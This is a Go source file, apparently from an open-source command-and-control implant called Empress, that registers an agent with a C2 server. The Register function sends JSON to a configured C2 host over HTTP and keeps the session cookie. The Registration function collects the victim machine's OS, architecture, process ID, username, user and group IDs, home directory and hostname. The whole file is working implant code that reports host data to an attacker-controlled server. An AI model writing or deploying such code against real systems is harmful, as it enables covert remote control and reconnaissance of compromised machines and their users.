package c2

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/pygrum/Empress/config"
	"github.com/pygrum/Empress/transport"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strconv"
)

// Register authenticates to C2 server using agent ID and some other config.
// This function is run once to initiate a session, and so doesn't expect data in a response.
// If registration is successful, the client will have the received cookie set.
func (c *Client) Register(regInfo *transport.Registration) error {
	data, err := json.Marshal(regInfo)
	if err != nil {
		return err
	}
	addr := fmt.Sprintf("http://%s:%d/", config.C.C2Host, config.C.C2Port)
	u, err := url.Parse(addr)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodGet, addr, bytes.NewReader(data))
	if err != nil {
		return err
	}
	resp, err := c.HttpClient.Do(req)
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		return errors.New("")
	}
	c.HttpClient.Jar.SetCookies(u, resp.Cookies())
	return nil
}

// Registration returns information about the OS for registration to the C2.
// Optionally, provide a response to a 'lost' c2 request if connection failed.
func Registration(data *transport.Response) *transport.Registration {
	reg := &transport.Registration{
		AgentID: config.C.AgentID,
		OS:      runtime.GOOS,
		Arch:    runtime.GOARCH,
		PID:     strconv.Itoa(os.Getpid()),
		Data:    data,
	}
	u, err := user.Current()
	if err == nil {
		reg.Username = u.Username
		reg.UID = u.Uid
		reg.GID = u.Gid
		reg.HomeDir = u.HomeDir
	}
	hostname, err := os.Hostname()
	if err == nil {
		reg.Hostname = hostname
	}
	return reg
}
